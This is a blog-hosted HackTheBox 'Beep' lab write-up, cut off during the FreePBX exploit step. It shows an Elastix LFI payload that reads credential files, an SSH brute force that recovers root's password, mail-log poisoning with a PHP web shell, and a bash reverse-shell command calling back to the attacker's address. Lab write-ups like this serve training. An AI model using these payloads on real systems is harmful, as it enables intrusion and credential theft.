<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Beep" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching possible exploits for Elastix, there are 4 available exploits for Elastix, since we have no way of finding out the version of Elastix, all exploits are tested. It is susceptible to Elastix 2.20 LFI , revealing credentials for root, SSH w/ found creds allowing us to obtain root user." /><meta property="og:description" content="Overview This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching possible exploits for Elastix, there are 4 available exploits for Elastix, since we have no way of finding out the version of Elastix, all exploits are tested. It is susceptible to Elastix 2.20 LFI , revealing credentials for root, SSH w/ found creds allowing us to obtain root user." /><link rel="canonical" href="https://yufongg.github.io/posts/Beep/" /><meta property="og:url" content="https://yufongg.github.io/posts/Beep/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-23T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Beep" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-08-23T00:00:00+08:00","description":"Overview This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching possible exploits for Elastix, there are 4 available exploits for Elastix, since we have no way of finding out the version of Elastix, all exploits are tested. It is susceptible to Elastix 2.20 LFI , revealing credentials for root, SSH w/ found creds allowing us to obtain root user.","headline":"HackTheBox - Beep","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Beep/"},"url":"https://yufongg.github.io/posts/Beep/"}</script><title>HackTheBox - Beep | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Beep</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220822213959.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Beep</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1661184000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-23 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1691 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that <code class="language-plaintext highlighter-rouge">Elastix</code> running on the webserver. After searching possible exploits for <code class="language-plaintext highlighter-rouge">Elastix</code>, there are 4 available exploits for <code class="language-plaintext highlighter-rouge">Elastix</code>, since we have no way of finding out the version of <code class="language-plaintext highlighter-rouge">Elastix</code>, all exploits are tested. It is susceptible to <code class="language-plaintext highlighter-rouge">Elastix 2.20 LFI</code> , revealing credentials for <code class="language-plaintext highlighter-rouge">root</code>, SSH w/ found creds allowing us to obtain <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>For the 2nd method, the same LFI exploit is used, but instead of including file that contains credentials, we do SMTP log poisoning that leads to RCE, allowing us to invoke a reverse shell, obtaining <code class="language-plaintext highlighter-rouge">asterisk</code> shell</p><p>For the 3rd method, <code class="language-plaintext highlighter-rouge">Elastix 2.2.0 / FreeBPX 2.10.0 - RCE</code> exploit is used, we first have to find an open extension via <code class="language-plaintext highlighter-rouge">svwar</code> enumeration which allows us to trigger a phonecall to that specific extension and when the call is answered (or goes to voicemail), our payload is executed on the VOIP server, allowing us to invoke a reverse shell, obtaining <code class="language-plaintext highlighter-rouge">asterisk</code> shell.</p><p>For the final method, after a web enumeration at TCP/10000 (HTTPS), it is discovered that <code class="language-plaintext highlighter-rouge">cgi-bin</code> scripts are running, shellshock exploit worked, allowing us to invoke a reverse shell to obtain <code class="language-plaintext highlighter-rouge">root</code>.</p><p>For the privilege escalation, <code class="language-plaintext highlighter-rouge">asterisk</code> has sudoers entry that allows <code class="language-plaintext highlighter-rouge">asterisk</code> to run several binaries that have GTFOBins entry (<code class="language-plaintext highlighter-rouge">nmap, chmod, yum</code>), allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code></p><h1 id="takeaways">Takeaways</h1><p>I learnt that if a web application version is unknown, you should try all exploits found on searchsploit to ensure that you have fully enumerated that service. Also, I learnt abit on VoIP enumeration from the FreeBPX exploit.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Beep<tr><td>IP<td>10.10.10.7<tr><td>Points<td>-<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/1">ch4p</a><tr><td>Release Date<td>15-March-2017</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Redirects to TCP/443 (HTTPS)</ul><h2 id="tcp443-https">TCP/443 (HTTPS) <a href="#tcp443-https" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>301      GET        9l       28w      309c https://10.10.10.7/admin =&gt; https://10.10.10.7/admin/
403      GET       10l       30w      286c https://10.10.10.7/cgi-bin/
403      GET       10l       30w      291c https://10.10.10.7/cgi-bin/.html
301      GET        9l       28w      311c https://10.10.10.7/configs =&gt; https://10.10.10.7/configs/
200      GET       35l      111w     1785c https://10.10.10.7/config.php
200      GET        1l        6w      894c https://10.10.10.7/favicon.ico
301      GET        9l       28w      308c https://10.10.10.7/help =&gt; https://10.10.10.7/help/
301      GET        9l       28w      310c https://10.10.10.7/images =&gt; https://10.10.10.7/images/
200      GET       35l      111w     1785c https://10.10.10.7/index.php
301      GET        9l       28w      308c https://10.10.10.7/lang =&gt; https://10.10.10.7/lang/
301      GET        9l       28w      308c https://10.10.10.7/libs =&gt; https://10.10.10.7/libs/
301      GET        9l       28w      308c https://10.10.10.7/mail =&gt; https://10.10.10.7/mail/
301      GET        9l       28w      311c https://10.10.10.7/modules =&gt; https://10.10.10.7/modules/
301      GET        9l       28w      309c https://10.10.10.7/panel =&gt; https://10.10.10.7/panel/
200      GET       35l      111w     1785c https://10.10.10.7/register.php
200      GET        2l        4w       28c https://10.10.10.7/robots.txt
301      GET        9l       28w      310c https://10.10.10.7/static =&gt; https://10.10.10.7/static/
301      GET        9l       28w      310c https://10.10.10.7/themes =&gt; https://10.10.10.7/themes/
301      GET        9l       28w      307c https://10.10.10.7/var =&gt; https://10.10.10.7/var/
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">cgi-bin</code></ul><h2 id="tcp10000-miniserv-157">TCP/10000 (MiniServ 1.57) <a href="#tcp10000-miniserv-157" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap">NMAP <a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PORT      STATE SERVICE REASON         VERSION
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
</pre></table></code></div></div><h1 id="initial-foothold---1">Initial Foothold - 1</h1><h2 id="tcp443-https---elastix-220-lfi-to-obtain-creds">TCP/443 (HTTPS) - Elastix 2.2.0 LFI to obtain creds <a href="#tcp443-https---elastix-220-lfi-to-obtain-creds" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><code class="language-plaintext highlighter-rouge">https://beep.htb</code> is running <code class="language-plaintext highlighter-rouge">Elastix</code> Server <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823010125.png" alt="" data-proofer-ignore><ul><li>Tried to look for version in the source code, failed</ul><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">Elastix</code> w/ <code class="language-plaintext highlighter-rouge">searchsploit</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Elastix 2.2.0 - â€˜graph.phpâ€™ Local File Inclusion<td>php/webapps/37637.pl<tr><td>Elastix 2.x - Blind SQL Injection<td>php/webapps/36305.txt<tr><td>Elastix &lt; 2.5 - PHP Code Injection<td>php/webapps/38091.php<tr><td>FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution<td>php/webapps/18650.py</table></div><ul><li>We can ignore the <code class="language-plaintext highlighter-rouge">XSS</code> exploits<li>There are only 4 exploits, we can try them all</ul><li>Try <code class="language-plaintext highlighter-rouge">php/webapps/37637.pl</code><ol><li>This exploit allows you to do local file inclusion due to the lack of user input sanitization.<li>Payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ...
 File: 37637.pl
 #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action
 ...
</pre></table></code></div></div><ul><li>This will include <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code> where login creds resides</ul><li>Exploit <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823011249.png" alt="" data-proofer-ignore><li>Obtain passwords<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# curl -sk 'https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action' | head -n 40 | tail -n 11 | grep PASS | cut -d '=' -f2  | sort | uniq &gt; password.txt
 amp109
 amp111
 jEhdIekWmdjE		
</pre></table></code></div></div><li>Obtain usernames<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# curl -sk 'https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action' | head -n 40 | tail -n 11 | grep USER | cut -d '=' -f2  | sort | uniq &gt; username.txt
 admin
 asteriskuser
</pre></table></code></div></div><li>Bruteforce w/ <code class="language-plaintext highlighter-rouge">burpsuite</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823013753.png" alt="" data-proofer-ignore><li>Results <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823013846.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">admin:jEhdIekWmdjE</code><li>Not really useful because it does not lead to RCE</ul><li>Obtain users on the system by including <code class="language-plaintext highlighter-rouge">/etc/passwd</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# curl -ks 'https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action' | cut -d ':' -f1 
 root
 fanis

 â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# echo -e "fanis\nroot" &gt; ssh_username
</pre></table></code></div></div></ol></ol><h1 id="initial-foothold---2">Initial Foothold - 2</h1><h2 id="elastix-220-lfi2rce-via-mail-log-poisoning">Elastix 2.2.0 LFI2RCE via Mail Log Poisoning <a href="#elastix-220-lfi2rce-via-mail-log-poisoning" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Uses the same LFI exploit <code class="language-plaintext highlighter-rouge">php/webapps/37637.pl</code>, but instead of including a file that reveal creds, SMTP log poisoning is done, leading to RCE.<li>How does it work<ul><li>A mail containing a webshell in its content is sent via SMTP and is stored in <code class="language-plaintext highlighter-rouge">/var/mail/&lt;user&gt;</code>, this allows <code class="language-plaintext highlighter-rouge">RCE</code> when including it.<li>SMTP must be up<li>We must have read access to <code class="language-plaintext highlighter-rouge">/var/mail/&lt;user&gt;</code></ul><li>Exploit<ol><li>Obtain list of usernames by including <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, and including the users until the file can be displayed<li>OR Obtain user that is running the webserver by including <code class="language-plaintext highlighter-rouge">/proc/self/status</code>, and including that same userâ€™s mail file<li>Include <code class="language-plaintext highlighter-rouge">/proc/self/status</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823031048.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">UID: 100</code> - <code class="language-plaintext highlighter-rouge">asterisk</code></ul><li>Poison <code class="language-plaintext highlighter-rouge">/var/mail/asterisk</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> telnet $ip 25
 MAIL FROM:0xyf
 RCPT TO: asterisk
 DATA
 &lt;?php system($_GET['c']); ?&gt;
 .
 QUIT
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823031539.png" alt="" data-proofer-ignore></p><li>Include <code class="language-plaintext highlighter-rouge">/var/mail/asterisk</code> &amp; execute commands<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&amp;module=Accounts&amp;action&amp;c=id;whoami
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823031715.png" alt="" data-proofer-ignore></p><li>Start listener<li>URL Encode payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep]
 â””â”€# hURL -U "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1"
		
 Original    :: /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1
 URL ENcoded :: %2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F4444%200%3E%261
		
</pre></table></code></div></div><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&amp;module=Accounts&amp;action&amp;c=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F4444%200%3E%261ex
</pre></table></code></div></div><li>Shell Obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823032242.png" alt="" data-proofer-ignore><li>More practice w/ the exact exploit<ul><li><a href="https://yufongg.github.io/posts/Symfonos-1/#tcp80-http---wordpress-plugin-exploit">Vulnhub Symfonos 1 - Mail Log Poisoning</a></ul></ol></ol><h2 id="tcp22-ssh---bruteforce">TCP/22 (SSH) - Bruteforce <a href="#tcp22-ssh---bruteforce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><a href="https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0">Fix</a> SSH error<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> Error: Unable to negotiate with 123.123.123.123 port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1
	
 subl ~/.ssh/config
 Host 10.10.10.7
     KexAlgorithms +diffie-hellman-group1-sha1
</pre></table></code></div></div><li>Bruteforce w/ <code class="language-plaintext highlighter-rouge">hydra</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# hydra -L ssh_username -P password.txt ssh://$ip -VI -t 1
 Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 02:10:36
 [DATA] max 1 task per 1 server, overall 1 task, 6 login tries (l:2/p:3), ~6 tries per task
 [DATA] attacking ssh://10.10.10.7:22/
 [ATTEMPT] target 10.10.10.7 - login "fanis" - pass "amp109" - 1 of 6 [child 0] (0/0)
 [ATTEMPT] target 10.10.10.7 - login "fanis" - pass "amp111" - 2 of 6 [child 0] (0/0)
 [ATTEMPT] target 10.10.10.7 - login "fanis" - pass "jEhdIekWmdjE" - 3 of 6 [child 0] (0/0)
 [ATTEMPT] target 10.10.10.7 - login "root" - pass "amp109" - 4 of 6 [child 0] (0/0)
 [ATTEMPT] target 10.10.10.7 - login "root" - pass "amp111" - 5 of 6 [child 0] (0/0)
 [ATTEMPT] target 10.10.10.7 - login "root" - pass "jEhdIekWmdjE" - 6 of 6 [child 0] (0/0)
 [22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
	
</pre></table></code></div></div><ul><li>Lowered threads because there is some sort of bruteforce prevention<li><code class="language-plaintext highlighter-rouge">root:jEhdIekWmdjE</code></ul><li>User &amp; Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> 19afda200dff5c746e0e0081fcdd64f3
 c28417887cd7e8cc9cf0ffde613de7a7
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823021626.png" alt="" data-proofer-ignore></p></ol><h1 id="initial-foothold---3">Initial Foothold - 3</h1><h2 id="freepbx-2100--elastix-220---remote-code-execution">FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution <a href="#freepbx-2100--elastix-220---remote-code-execution" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>FreeBPX<ul><li>FreePBX isÂ <em>a web-based open-source graphical user interface (GUI) that manages Asterisk, a voice over IP and telephony server</em>.</ul><li>Try <code class="language-plaintext highlighter-rouge">php/webapps/18650.py</code><ol><li>This exploit allows you to do RCE w/o authentication due to lack of input sanitization<ul><li>[Explanation](https://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</ul><li>We have to find an open extension w/ <code class="language-plaintext highlighter-rouge">svwar</code> via bruteforce it until a valid one comes up<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep]
 â””â”€# svwar -m INVITE -e200-300 10.10.10.7
 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
 +-----------+----------------+
 | Extension | Authentication |
 +===========+================+
 | 233       | reqauth        |
 +-----------+----------------+

</pre></table></code></div></div><ul><li>I had to try it multiple times to get <code class="language-plaintext highlighter-rouge">reqauth</code> extension</ul><li>Update <code class="language-plaintext highlighter-rouge">18650.py</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823043714.png" alt="" data-proofer-ignore><li>Start listener at port 443<li>Exploit<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# python 18650.py 
